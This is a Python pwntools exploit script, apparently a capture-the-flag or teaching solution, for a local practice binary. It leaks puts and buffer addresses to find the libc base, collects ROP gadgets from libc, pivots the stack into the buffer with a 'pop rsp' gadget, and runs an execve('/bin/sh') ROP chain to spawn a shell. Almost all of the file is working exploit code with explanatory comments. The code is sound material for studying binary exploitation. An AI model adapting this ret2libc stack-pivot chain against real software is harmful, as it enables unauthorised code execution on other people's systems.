#!/bin/python3

from pwn import process, gdb, p64
from pwn import ELF, ROP
from sys import argv

p = gdb.debug('./a.out', gdbscript="""
    b *main
    continue
""") if len(argv) > 1 else process('./a.out')

elf = ELF('./a.out')
libc = elf.libc

p.recvuntil(b'puts: ')
puts_leak = int(p.recvuntil(b'\n'), 16)

p.recvuntil(b'buf: ')
buf_leak = int(p.recvuntil(b'\n'), 16)

# Can calculate libc base address from this information
libc_base = puts_leak - libc.sym['puts']


"""

Finding useful gadgets for later

"""

# I wasn't as generous in providing helpful gadgets in the binary
#   this time, so we will have to get them from libc
libc_rop = ROP(libc)

pop_rdi_ret = libc_base + libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_ret = libc_base + libc_rop.find_gadget(['pop rsi', 'ret'])[0]
libc.address = libc_base

# Libc also wasn't as forgiving and didn't give me a straight up
#   pop rdx followed by ret, so we will have to make do with what
#   ever else we can find.
print(libc_rop.find_gadget(['pop rdx']))

# There was a pop rdx, pop r12, ret. This will be useful but you
#   have to account for the extra 'pop' instruction by adding 8
#   garbage bytes in the rop chain to be popped into r12
pop_rdx_ret = libc_base + libc_rop.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]


"""

Step 1: The pivot

    The program does not read enough bytes in order for us to get the
entire rop chain at the end of the buffer. Instead of putting out rop
chain at the saved rip, we will pivot the stack and sorta 'scoot' over
to a different location where we do have room to leave our rop chain.

"""

# We will need a gadget to tinker with the stack pointer. There
#   are a few ways to do this, but I will pick a simpler one
#   ...
# My goto gadgets for this approach is typically ['pop rbp', 'ret']
#   followed by ['leave', 'ret'], however this should work too
pop_rsp_ret = libc_base + libc_rop.find_gadget(['pop rsp', 'ret'])[0]

# This only requires 16 bytes, much smalled than the size of
#   the full execve rop chain.
pivot = p64(pop_rsp_ret) + p64(buf_leak)


"""

Step 2: Making the real rop chain

    Just the same execve, just keep in mind that we were not able
to find a 'pop rdx' followed by 'ret', so some slight improvization
will be necessary

"""

bin_sh_addr = next(libc.search(b'/bin/sh'))

chain = p64(pop_rdi_ret)    \
    + p64(bin_sh_addr)      \
    + p64(pop_rsi_ret)      \
    + p64(0)                \
    + p64(pop_rdx_ret)      \
    + p64(0)                \
    + p64(0)                \
    + p64(libc.sym['execve'])


"""

Step 3: Send it

    We kind of have to send it all in one go. In case it is not
clear, the pivot chain is executed first. This pivot chain moves
the stack pointer to point to the start of the buffer, which is
where we left the execve chain.

    Since the stack points to the execve chain once we are done
with the pivot chain, it will begin popping from the execve chain
like nothing ever happened. A neat way to potentially give urself
more room to work with.

"""

payload = chain.ljust(0x58, b'i') + pivot
p.sendline(payload)

# Enjoy the shell c:
p.interactive()
